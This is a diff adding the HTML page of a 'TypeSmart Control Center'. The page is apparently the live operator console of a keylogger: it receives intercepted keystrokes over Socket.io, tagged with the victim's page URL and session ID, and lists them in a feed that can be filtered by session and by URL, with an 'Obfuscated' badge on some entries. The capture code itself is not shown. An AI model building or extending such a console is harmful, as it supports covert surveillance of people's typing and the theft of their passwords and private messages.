@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TypeSmart Control Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body {
+            background-color: #0f172a; /* Slate 900 */
+            color: #22c55e; /* Green 500 */
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e293b; 
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #475569; 
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #64748b; 
+        }
+    </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden">
+    <!-- Header -->
+    <header class="bg-slate-900 border-b border-slate-700 p-4 flex justify-between items-center shadow-md z-10">
+        <h1 class="text-2xl font-bold tracking-wider text-green-400">TypeSmart Control Center <span class="text-sm font-normal text-slate-400 ml-2">v1.0</span></h1>
+        
+        <div class="flex items-center space-x-4">
+            <div class="flex items-center space-x-2">
+                <span class="text-sm text-slate-300">Status:</span>
+                <div id="connection-status" class="flex items-center text-red-500 font-bold transition-colors duration-300">
+                    <span class="w-3 h-3 rounded-full bg-red-500 mr-2 shadow-[0_0_8px_rgba(239,68,68,0.8)]" id="status-indicator"></span>
+                    <span id="status-text">Disconnected</span>
+                </div>
+            </div>
+            <button id="clear-feed" class="bg-green-800 hover:bg-green-700 text-green-100 px-3 py-1 rounded text-sm transition-colors border border-green-600">
+                Clear Feed
+            </button>
+        </div>
+    </header>
+
+    <div class="flex flex-1 overflow-hidden">
+        <!-- Sidebar -->
+        <aside class="w-64 bg-slate-800 border-r border-slate-700 flex flex-col hidden md:flex">
+            <div class="p-4 border-b border-slate-700">
+                <h2 class="text-green-500 font-bold mb-2 uppercase text-sm tracking-wider">Active Sessions</h2>
+                <div class="relative">
+                    <button id="filter-all" class="w-full text-left px-3 py-2 bg-slate-700 text-white rounded text-sm hover:bg-slate-600 transition-colors border border-slate-600 active-filter">
+                        All Sessions
+                    </button>
+                </div>
+            </div>
+            <div class="flex-1 overflow-y-auto p-4">
+                <ul id="session-list" class="space-y-2 text-sm text-slate-300">
+                    <!-- Session IDs will populate here -->
+                </ul>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="flex-1 flex flex-col bg-slate-900 relative">
+            
+            <!-- Search / Tool Bar -->
+            <div class="p-4 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between backdrop-blur-sm">
+                <div class="relative w-full max-w-md">
+                    <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-400">
+                        <svg class="w-4 h-4" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
+                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"/>
+                        </svg>
+                    </div>
+                    <input type="text" id="search-input" class="bg-slate-700 border border-slate-600 text-white text-sm rounded focus:ring-green-500 focus:border-green-500 block w-full pl-10 p-2 placeholder-slate-400" placeholder="Filter logs by URL keyword...">
+                </div>
+                <div class="text-xs text-slate-400 ml-4 whitespace-nowrap">
+                    Logs: <span id="log-count" class="text-green-400 font-bold">0</span>
+                </div>
+            </div>
+
+            <!-- Feed Container -->
+            <div id="log-feed" class="flex-1 overflow-y-auto p-4 space-y-4 shadow-inner">
+                <!-- Log Cards will populate here -->
+                <div id="empty-state" class="flex flex-col items-center justify-center h-full text-slate-500 space-y-4 opacity-50">
+                    <svg class="w-16 h-16 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                    <p class="tracking-widest">WAITING FOR INTERCEPTIONS...</p>
+                </div>
+            </div>
+            
+        </main>
+    </div>
+
+    <!-- Script Implementation -->
+    <script>
+        const socket = io({
+            reconnection: true,
+            reconnectionAttempts: Infinity,
+            reconnectionDelay: 1000,
+            reconnectionDelayMax: 5000,
+        });
+
+        // DOM Elements
+        const statusIndicator = document.getElementById('status-indicator');
+        const statusText = document.getElementById('status-text');
+        const connectionStatus = document.getElementById('connection-status');
+        const logFeed = document.getElementById('log-feed');
+        const emptyState = document.getElementById('empty-state');
+        const sessionList = document.getElementById('session-list');
+        const filterAllBtn = document.getElementById('filter-all');
+        const clearFeedBtn = document.getElementById('clear-feed');
+        const searchInput = document.getElementById('search-input');
+        const logCountEl = document.getElementById('log-count');
+
+        // State variables
+        let logs = [];
+        let uniqueSessions = new Set();
+        let selectedSession = null;
+        let searchQuery = '';
+
+        // --- Socket.io Event Listeners ---
+        
+        socket.on('connect', () => {
+            statusText.textContent = 'Live';
+            connectionStatus.classList.remove('text-red-500');
+            connectionStatus.classList.add('text-green-500');
+            statusIndicator.classList.remove('bg-red-500', 'shadow-[0_0_8px_rgba(239,68,68,0.8)]');
+            statusIndicator.classList.add('bg-green-500', 'shadow-[0_0_8px_rgba(34,197,94,0.8)]');
+        });
+
+        socket.on('disconnect', () => {
+            statusText.textContent = 'Disconnected';
+            connectionStatus.classList.add('text-red-500');
+            connectionStatus.classList.remove('text-green-500');
+            statusIndicator.classList.add('bg-red-500', 'shadow-[0_0_8px_rgba(239,68,68,0.8)]');
+            statusIndicator.classList.remove('bg-green-500', 'shadow-[0_0_8px_rgba(34,197,94,0.8)]');
+        });
+
+        socket.on('new-log', (data) => {
+            // Unshift new log into state
+            logs.unshift(data);
+            
+            // Track session IDs
+            if (data.sessionId && !uniqueSessions.has(data.sessionId)) {
+                uniqueSessions.add(data.sessionId);
+                renderSessionSidebar();
+            }
+
+            // Hide empty state if visible
+            if (logs.length === 1) {
+                emptyState.style.display = 'none';
+            }
+
+            // Update ui conditionally
+            if (shouldShowLog(data)) {
+                prependLogToDOM(data);
+                updateLogCount();
+            }
+        });
+
+        // --- Core UI Functions ---
+
+        function formatTime(timestamp) {
+            const date = new Date(timestamp || Date.now());
+            return date.toLocaleTimeString('en-US', { hour12: false });
+        }
+
+        function createLogCard(log) {
+            const card = document.createElement('div');
+            card.className = 'w-full bg-slate-800 border border-slate-700 rounded-lg p-4 shadow-sm fade-in log-card';
+            
+            const HeaderDiv = document.createElement('div');
+            HeaderDiv.className = 'flex justify-between items-start mb-3 border-b border-slate-700 pb-2';
+            
+            const UrlWrapper = document.createElement('div');
+            UrlWrapper.className = 'flex items-center space-x-2 overflow-hidden';
+            
+            const UrlIco = document.createElement('span');
+            UrlIco.className = 'text-green-500';
+            UrlIco.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>';
+            
+            const TargetUrl = document.createElement('a');
+            TargetUrl.href = log.url || '#';
+            TargetUrl.target = '_blank';
+            TargetUrl.className = 'text-blue-400 hover:text-blue-300 hover:underline truncate max-w-lg font-sans';
+            TargetUrl.textContent = log.url || 'Unknown URL';
+            
+            UrlWrapper.appendChild(UrlIco);
+            UrlWrapper.appendChild(TargetUrl);
+            
+            if (log.obfuscated) {
+                const badge = document.createElement('span');
+                badge.className = 'bg-yellow-900/50 text-yellow-500 text-xs px-2 py-0.5 rounded border border-yellow-700 ml-2 whitespace-nowrap';
+                badge.textContent = 'Obfuscated';
+                UrlWrapper.appendChild(badge);
+            }
+
+            const MetaDiv = document.createElement('div');
+            MetaDiv.className = 'flex flex-col items-end space-y-1';
+            
+            const TimeSpan = document.createElement('span');
+            TimeSpan.className = 'text-xs text-slate-400 font-bold';
+            TimeSpan.textContent = formatTime(log.timestamp);
+            
+            const SessionBadge = document.createElement('span');
+            SessionBadge.className = 'bg-slate-700 text-slate-300 text-[10px] px-1.5 py-0.5 rounded shadow-sm border border-slate-600 truncate max-w-[120px]';
+            SessionBadge.textContent = log.sessionId ? log.sessionId.substring(0, 15) + (log.sessionId.length > 15 ? '...' : '') : 'anonymous';
+
+            MetaDiv.appendChild(TimeSpan);
+            MetaDiv.appendChild(SessionBadge);
+
+            HeaderDiv.appendChild(UrlWrapper);
+            HeaderDiv.appendChild(MetaDiv);
+
+            const ContentDiv = document.createElement('div');
+            ContentDiv.className = 'bg-slate-900 rounded p-3 text-green-400 text-sm whitespace-pre-wrap break-all border border-slate-700 font-mono shadow-inner min-h-[60px]';
+            ContentDiv.textContent = log.keys || '';
+
+            card.appendChild(HeaderDiv);
+            card.appendChild(ContentDiv);
+            
+            return card;
+        }
+
+        function prependLogToDOM(log) {
+            const card = createLogCard(log);
+            // insert right after the empty state
+            logFeed.insertBefore(card, emptyState.nextSibling);
+        }
+
+        function shouldShowLog(log) {
+            const matchesSession = !selectedSession || log.sessionId === selectedSession;
+            const matchesSearch = !searchQuery || (log.url && log.url.toLowerCase().includes(searchQuery));
+            return matchesSession && matchesSearch;
+        }
+
+        function reRenderFeed() {
+            // Remove existing cards
+            document.querySelectorAll('.log-card').forEach(c => c.remove());
+            
+            let displayed = 0;
+            logs.forEach(log => {
+                if (shouldShowLog(log)) {
+                    // Because we are iterating newest to oldest, we just append to the feed
+                    logFeed.appendChild(createLogCard(log));
+                    displayed++;
+                }
+            });
+
+            if (logs.length === 0) {
+                emptyState.style.display = 'flex';
+                emptyState.innerHTML = '<svg class="w-16 h-16 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg><p class="tracking-widest">WAITING FOR INTERCEPTIONS...</p>';
+            } else if (displayed === 0) {
+                emptyState.style.display = 'flex';
+                emptyState.innerHTML = '<p class="text-slate-500 text-sm mt-10">No logs match the current filters.</p>';
+            } else {
+                emptyState.style.display = 'none';
+            }
+
+            updateLogCount(displayed);
+        }
+
+        function updateLogCount(countParam) {
+            let count = countParam;
+            if (count === undefined) {
+                count = document.querySelectorAll('.log-card').length;
+            }
+            logCountEl.textContent = count;
+        }
+
+        function renderSessionSidebar() {
+            sessionList.innerHTML = '';
+            uniqueSessions.forEach(session => {
+                const li = document.createElement('li');
+                const btn = document.createElement('button');
+                btn.className = `w-full text-left px-3 py-1.5 rounded text-xs transition-colors border ${selectedSession === session ? 'bg-slate-600 text-white border-slate-500' : 'bg-transparent text-slate-400 border-transparent hover:bg-slate-700 hover:text-slate-200'}`;
+                
+                const shortId = session.substring(0, 16) + (session.length > 16 ? '...' : '');
+                btn.innerHTML = `<span class="inline-block w-2 h-2 rounded-full bg-slate-500 mr-2"></span>${shortId}`;
+                
+                btn.onclick = () => {
+                    selectedSession = session;
+                    // Reset styling on filter all
+                    filterAllBtn.className = 'w-full text-left px-3 py-2 bg-transparent text-slate-400 rounded text-sm hover:bg-slate-700 transition-colors border border-transparent';
+                    renderSessionSidebar(); // Re-render to update selected styling
+                    reRenderFeed();
+                };
+
+                if (selectedSession === session) {
+                    btn.querySelector('span').classList.remove('bg-slate-500');
+                    btn.querySelector('span').classList.add('bg-green-500');
+                }
+
+                li.appendChild(btn);
+                sessionList.appendChild(li);
+            });
+        }
+
+        // --- DOM Event Listeners ---
+
+        filterAllBtn.addEventListener('click', () => {
+            selectedSession = null;
+            filterAllBtn.className = 'w-full text-left px-3 py-2 bg-slate-700 text-white rounded text-sm hover:bg-slate-600 transition-colors border border-slate-600 active-filter';
+            renderSessionSidebar();
+            reRenderFeed();
+        });
+
+        clearFeedBtn.addEventListener('click', () => {
+            if (confirm("Are you sure you want to clear all localized logs?")) {
+                logs = [];
+                uniqueSessions.clear();
+                selectedSession = null;
+                searchQuery = '';
+                searchInput.value = '';
+                filterAllBtn.click(); // Resets selection & re-renders
+            }
+        });
+
+        searchInput.addEventListener('input', (e) => {
+            searchQuery = e.target.value.toLowerCase().trim();
+            reRenderFeed();
+        });
+
+    </script>
+</body>
+</html>
